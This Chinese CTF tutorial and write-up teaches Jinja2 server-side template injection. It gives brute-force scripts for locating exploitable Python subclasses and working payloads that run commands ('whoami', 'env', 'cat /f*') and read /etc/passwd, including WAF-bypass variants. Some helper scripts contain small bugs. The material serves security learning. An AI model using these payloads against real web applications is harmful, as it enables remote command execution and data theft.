---
title: SSTI入门
date: 2026-02-01 12:12:54
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/image-20260210225443510.png
categories: CTF
---

# 前置知识

学习的时候用OneNote，懒得再写一篇Markdown了，这里超了一下acc师哥的周报

本篇的继承链的作用就是寻找os模块并利用，我们依然有不用os模块的解法

```Plain
{{open('/flag').read()}}
```

### 利用逻辑

classA 子类

base方法找父类，object是最顶端，mro方法向上找所有父类，subclasses方法向下找所有子类

### 常用注入模块

#### 1.文件读取

```Plain
<class '_frozen_importlib_external.FileLoader'>
```

要找到这个fileloader模块

##### python脚本查找

```Python
import requests
url=''
for i in range(500):
    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}
    #name是提交数据的名字，根据不同题目变换
    try:
        response=requests.post(url,data=data)#提交方式也要注意
        #print(response.text)
        if response.status_code==200:
            if '_frozen_importlib_external.FileLoader' in response.text:
            #查找所需子类_frozen_importlib_external.FileLoader
                print(i)
        except:
        pass
```

##### fileloader模块的利用方式

```Python
{{''.__class__.__mro__[1].__subclasses__()[79]["get_data"](0,"/etc/passwd")}}
```

找到fileloader模块后就可以get data读取文件（subclasses后面不一定是79，要根据实际情况找），第一个参数是0保持不变，第二个就是要查看的文件路径

#### 2.内嵌函数eval执行命令

##### python脚本查看可以利用内建函数eval的模块

```Python
import requests
url=''
for i in range(500):
    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}"}
    #不同靶场name的值要改
    try:
        response=requests.post(url,data=data)#请求方式也要注意
        #print(response.text)
        if response.status_code==200:
            if 'eval' in response.text:
                print(i)
    except:
        pass
```

可能会有很多都有eval函数，随便选一个用就行

eval函数用法

```Python
{{''.__class__.__bases__[0].__subclasses__()[65].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /etc/passwd").read()')}}#加上read有回显
```

#### 3.os模块执行命令

##### 在其他函数中直接调用os模块

通过config调用os

```Python
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

通过url_for调用os

```Python
{{url_for.__globals__.os.popen('whoami').read()}}
```

在已经加载os模块的子类里直接调用os模块

```Python
{{''.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__['popen']("ls /").read()}}
{{().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls /')").read()}}
```

##### python脚本查找已经加载os模块的子类

```Python
import requests
url=''
for i in range(500):
    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__}}"}
    try:
        response=requests.post(url,data=data)
        #print(response.text)
        if response.status_code==200:
            if 'os.py' in responst.text:
                print(i)
    except:
        pass
```

#### 4.importlib类执行命令

可以加载第三方库，使用load_module加载os

##### python脚本查找

```Plain
_frozen_importlib.BuiltinImporter
import requests
url=''
for i in range(500):
    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}
    try:
        response=requests.post(url,data=data)
        if response.status_code==200:
            if '_frozen_importlib.BuiltinImporter' in response.text:
                print(i)
    except:
        pass
```

##### 用法

```Python
{{''.__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("ls /").read()}}
```

#### 5.linecache函数执行命令

linecache函数可用于读取任意一个文件的某一行，而这个函数中也引入了os模块，所以我们也可以利用这个linecache函数去执行命令

##### python脚本查找

```Python
import requests
url=''
for i in range(500):
    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__}}"}
    try:
        response=requests.post(url,data=data)
        if response.status_code==200:
            if 'linecache' in response.text:
                print(i)
    except:
        pass
```

##### 用法

```Python
{{().__class__.__base__.__subclasses__()[191].__init__.__globals__['linecache']['os'].popen("ls /").read()}}
{{().__class__.__base__.__subclasses__()[192].__init__.__globals__.linecache.os.popen("ls /").read()}}
```

#### 6.subprocess.Popen类执行命令

从python2.4版本开始，可以用subprocess这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。

subprocess意在替代其他几个老的模块或者函数，比如os.system或者os.popen等函数

##### python脚本查找

```Python
import requests
url=''
for i in range(500):
    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}
    try:
        response=requests.post(url,data=data)
        if response.status_code==200:
            if 'subprocess.Popen' in response.text:
                print(i)
    except:
        pass
```

用法

```Python
{{''.__class__.__base__.__subclasses__()[200]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}
```

# 实战

## [PCTF2025]复读机

非常简单的SSTI，没有过滤，直接用config链

```
{{config.__class__.__init__.__globals__['os'].popen('env').read()}}
```

![](https://pic1.imgdb.cn/item/697f08b41535a8fb9d25a98c.png)

## [SDPCSEC第一次纳新]reallogin

![](https://pic1.imgdb.cn/item/697ef5c91535a8fb9d256b49.png)

一个登录页面，渲染用户名，猜测SSTI，测试一下

```
{{7*7}}
```

回显49，有WAF，用burp扫一下

![](https://pic1.imgdb.cn/item/697efddc1535a8fb9d2589a9.png)

点字符和一些关键字被ban了

这里我选择用cycler的链子+拼写绕过

```
{{(cycler['next']['__g''lobals__']['o''s']['p''open']('cat /f*'))['read']()}}
```

![](https://pic1.imgdb.cn/item/697f00131535a8fb9d2589b1.png)

wp用的是通用对象链，先查询子类

```
 {{''['__cla'+'ss__']['__ba'+'ses__'][0]['__subc'+'lasses__']()}}
```

![](https://pic1.imgdb.cn/item/697f02081535a8fb9d2589bc.png)

```
{{''['__cla'+'ss__']['__ba'+'ses__'][0]['__subc'+'lasses__']()[132]['__in'+'it__']['__glo'+'bals__']['po'+'pen']
('cat /f*')|attr('read')()}}
```

## [BaseCTF2024]复读机

算是上面那个的进阶版，过滤了很多字符和关键字，而且设定了格式和括号匹配所以测起来比较麻烦

![](https://pic1.imgdb.cn/item/697f100e1535a8fb9d25ad0d.png)

{% raw %}

一定要用BaseCTF{%print()}包裹，不然测不出来

```
+ - * / . {{ }} __ : " \
```

这些符号被过滤了

/被过滤了比较难处理，我用了ASCII码绕过

```
BaseCTF{%set sun='%c%c%c%c%c%c%c'%(99,97,116,32,47,102,42)%}{%print ((sb|attr('_''_eq_''_'))['_''_''g''lobals''_''_']['sys']['modules']['o''s']['p''open'](sun))['read']()%}
```

wp中的法一与我的方法类似，它用的是通用对象链

```
BaseCTF{% set cmd='cat '~'%c'%(47)~'flag' %}
{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen'](cmd)['rea''d']())%}
```

{% endraw %}

法二：利用环境变量的值

查看环境变量，可以看到 `OLDPWD=/`

{% raw %}

```
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('env')['rea''d']())%}
```

此时可以直接利用它来切换到根目录，然后再读flag

```
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('cd $OLDPWD;cat flag')['rea''d']())%}
```

{% endraw %}

法三：利用 `expr substr` 切割出一个 `/`

比如 pwd 中的第一个字符就是 `/` ，那用 `expr substr` 切割出来后，之后就可以像法二那样切换到根目录然后读 flag 了

{% raw %}

```
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('a=`pwd`;a=`expr substr $a 1 1`;cd $a;cat flag')['rea''d']())%}
```

{% endraw %}

pwd的作用是打印当前工作目录的绝对路径，所以它的输出必然以 `/` 开头

## 参考文献

[细说Jinja2之SSTI&bypass](https://blog.csdn.net/qq_38154820/article/details/111399386)

[Python SSTI漏洞学习总结 _](https://www.cnblogs.com/tuzkizki/p/15394415.html)
